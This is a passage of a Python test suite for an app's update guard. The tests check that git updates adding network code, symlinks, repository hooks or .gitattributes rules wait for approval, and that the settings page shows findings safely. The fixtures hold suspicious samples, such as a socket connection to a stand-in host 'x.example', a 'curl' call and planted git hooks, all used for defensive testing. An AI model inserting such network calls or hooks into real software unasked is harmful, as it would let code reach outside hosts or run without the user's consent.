        self.assertTrue(res["ok"], res); self.assertEqual(self.head(), sha); self.assertEqual(res["version"], "1.0.1")

    def test_with_findings_it_waits_at_the_old_commit(self):
        sha = self.commit({"work.py": SMALL["work.py"] + b"\nimport socket\n", "VERSION": b"1.0.1\n"})
        res = updates.install_via_git(restart=False)
        self.assertTrue(res.get("needs_approval"), res); self.assertEqual(kinds(res["review"]["findings"]), {"module"})
        self.assertEqual(self.head(), self.first)
        with open(os.path.join(self.prog, "work.py"), "rb") as f:
            self.assertEqual(f.read(), SMALL["work.py"])
        self.assertTrue(updates.install_via_git(restart=False, approved="0" * 64).get("needs_approval"))
        # more arrives after you looked: the approval was for the earlier files
        sha2 = self.commit({"tools.py": SMALL["tools.py"] + b"\n\ndef more():\n    return run('curl')\n"})
        again = updates.install_via_git(restart=False, approved=res["review"]["digest"])
        self.assertTrue(again.get("needs_approval")); self.assertEqual(self.head(), self.first)
        done = updates.install_via_git(restart=False, approved=again["review"]["digest"])
        self.assertTrue(done["ok"], done); self.assertEqual(self.head(), sha2); self.assertNotEqual(sha, sha2)

    def test_hooks_links_and_rules_of_the_repository(self):
        # a hook in the clone would run on merging: git is started without hooks
        hooks = os.path.join(self.prog, ".git", "hooks")
        os.makedirs(hooks, exist_ok=True)
        mark = os.path.join(self.dir, "hook-ran")
        for name in ("post-merge", "post-checkout", "reference-transaction"):
            with open(os.path.join(hooks, name), "w") as f:
                f.write("#!/bin/sh\ntouch '%s'\n" % mark)
            os.chmod(os.path.join(hooks, name), 0o755)
        self.commit({"VERSION": b"1.0.1\n"})
        self.assertTrue(updates.install_via_git(restart=False)["ok"]); self.assertFalse(os.path.exists(mark))
        # a link is no file: where it points was never read
        os.symlink("tests/test_x.py", os.path.join(self.origin, "linked.py"))
        self.commit({"VERSION": b"1.0.2\n"})
        res = updates.install_via_git(restart=False)
        self.assertTrue(res.get("needs_approval")); self.assertEqual([(f["kind"], f["file"], f["what"]) for f in res["review"]["findings"]], [("file", "linked.py", "link")])
        self.assertFalse(os.path.lexists(os.path.join(self.prog, "linked.py")))
        os.remove(os.path.join(self.origin, "linked.py"))
        # rules of the repository that make git treat files differently when it writes them: shown
        self.commit({".gitattributes": b"*.py filter=other\n", "VERSION": b"1.0.3\n"})
        res = updates.install_via_git(restart=False)
        self.assertTrue(res.get("needs_approval")); self.assertEqual([(f["kind"], f["file"]) for f in res["review"]["findings"]], [("file", ".gitattributes")])
        self.assertTrue(updates.install_via_git(restart=False, approved=res["review"]["digest"])["ok"])
        self.commit({"VERSION": b"1.0.4\n"})                    # the rules as they are now: nothing new
        self.assertTrue(updates.install_via_git(restart=False)["ok"])

    def test_not_a_clone(self):
        updates.HERE = self.dir
        self.assertIsNone(updates.install_via_git(restart=False))


class Settings(unittest.TestCase):
    """Einstellungen -> Updates in the browser: an update without findings looks as ever; one with findings is marked in the
    menu, shows what was found, and is installed with an approval for exactly the files shown."""

    @classmethod
    def setUpClass(cls):
        import threading
        from http.server import ThreadingHTTPServer
        sys.path.insert(0, os.path.dirname(__file__))
        from test_tour import PASSWORD, _playwright, settle
        from test_e2e import MockBridge, config_for_test, patch_today, reset_mock
        from service import App, make_handler
        from storage import Store, load_or_create_master_key
        cls.sync_playwright, cls.settle, cls.password = staticmethod(_playwright()), staticmethod(settle), PASSWORD
        cls.dir = tempfile.mkdtemp(prefix="kontor-guard-ui-")
        key, src = load_or_create_master_key(cls.dir)
        store = Store(cls.dir, key, src); store.save("config.json", config_for_test(os.path.join(cls.dir, "Belege")))
        reset_mock(); patch_today()
        cls.app = App(store, cls.dir, bridge_factory=MockBridge)
        cls.app.do_run(False, True)
        cls.srv = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(cls.app))
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()
        cls.base = "http://127.0.0.1:%d/" % cls.srv.server_address[1]

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown(); cls.srv.server_close()
        shutil.rmtree(cls.dir, ignore_errors=True)

    def info(self, findings):
        return {"current": "1.0.0", "available": "9.9.9", "newer": True, "error": None, "notes": "", "date": "", "source": "main",
                "review": {"digest": "d" * 64, "findings": findings}}

    def test_marked_shown_and_approved(self):
        finds = [{"kind": "module", "file": "work.py", "what": "import socket", "new": True},
                 {"kind": "call", "file": "work.py", "what": "send: socket.create_connection(('x.example', 443))", "new": True},
                 {"kind": "call", "file": "tools.py", "what": "show: subprocess.run(['open', path])", "new": False},
                 {"kind": "address", "file": "web/app.js", "what": "https://x.example/<b>a</b>", "new": True}]
        self.app.update_info = self.info(finds)
        asked = []
        keep = updates.install

        def until(pg, js, seconds=15.0):                        # (no waiting with eval: the pages' security rules forbid it)
            import time
            t0 = time.time()
            while time.time() - t0 < seconds:
                if pg.evaluate(js):
                    return
                pg.wait_for_timeout(80)
            self.fail("not reached: " + js)

        def install(repo, zip_url=None, restart=True, approved=""):
            asked.append(approved)                              # read again: now it holds something else -- nothing installed
            return {"ok": False, "needs_approval": True, "version": "9.9.9", "text": "wartet", "review": {"digest": "e" * 64, "findings": finds[:1]}}
        updates.install = install
        try:
            with self.sync_playwright() as p:
                b = p.chromium.launch()
                for device in ({"viewport": {"width": 1440, "height": 900}}, {"viewport": {"width": 390, "height": 844}, "is_mobile": True, "has_touch": True}):
                    self.app.update_info = self.info(finds)
                    pg = b.new_context(**device).new_page()
                    errors = []
                    pg.on("pageerror", lambda e: errors.append(str(e)))
                    pg.goto(self.base); pg.fill("#login-pw", self.password)
                    if pg.is_visible("#login-pw2"):
                        pg.fill("#login-pw2", self.password)
                    pg.click("#login-btn"); pg.wait_for_selector("#shell:not(.hidden)", timeout=30000); self.settle(pg)
                    pg.evaluate("location.hash = '#settings/updates'"); pg.wait_for_selector("#up-review", timeout=15000)
                    self.assertEqual(pg.evaluate("document.querySelector('#nav a[href=\"#settings\"] .nbadge').textContent"), "!")
                    self.assertEqual(pg.evaluate("document.querySelectorAll('#up-review details').length"), 3)          # one line per kind
                    self.assertEqual(pg.evaluate("document.querySelector('#up-review').querySelectorAll('b b, code b').length"), 0)     # shown as text
                    self.assertIn("<b>a</b>", pg.evaluate("document.querySelector('#up-review').textContent"))
                    self.assertEqual(pg.inner_text("#up-install").strip(), "Freigeben und installieren")
                    self.assertLessEqual(pg.evaluate("document.documentElement.scrollWidth"), pg.evaluate("document.documentElement.clientWidth") + 1)
                    # not confirmed: nothing is asked of the service
                    pg.once("dialog", lambda d: d.dismiss()); pg.click("#up-install"); pg.wait_for_timeout(200)
                    self.assertEqual(asked, [])
                    # confirmed: approved for the files shown; Kontor reads again, finds something else and shows that instead
                    pg.once("dialog", lambda d: d.accept()); pg.click("#up-install")
                    until(pg, "document.querySelectorAll('#up-review details').length === 1")
                    self.assertEqual(asked, ["d" * 64]); asked.clear()
                    self.assertEqual(self.app.update_info["review"]["digest"], "e" * 64)
                    # an update without findings: as ever -- a dot in the menu, the plain button, no word about findings
                    self.app.update_info = self.info([])
                    pg.reload(); pg.wait_for_selector("#shell:not(.hidden)", timeout=30000); self.settle(pg)
                    pg.wait_for_selector("#up-install", timeout=15000)
                    self.assertIsNone(pg.query_selector("#up-review"))
                    self.assertEqual(pg.evaluate("document.querySelector('#nav a[href=\"#settings\"] .nbadge').className"), "nbadge")       # the plain dot
                    self.assertEqual(pg.inner_text("#up-install").strip(), "Update installieren und Dienst neu starten")
                    pg.click("#up-install"); until(pg, "document.querySelector('#up-review') !== null")     # (the stand-in answers "waits")
                    self.assertEqual(asked, [""]); asked.clear()
                    self.assertEqual(errors, [])
                    pg.context.close()
                b.close()
        finally:
            updates.install = keep
            self.app.update_info = None


if __name__ == "__main__":
    unittest.main()
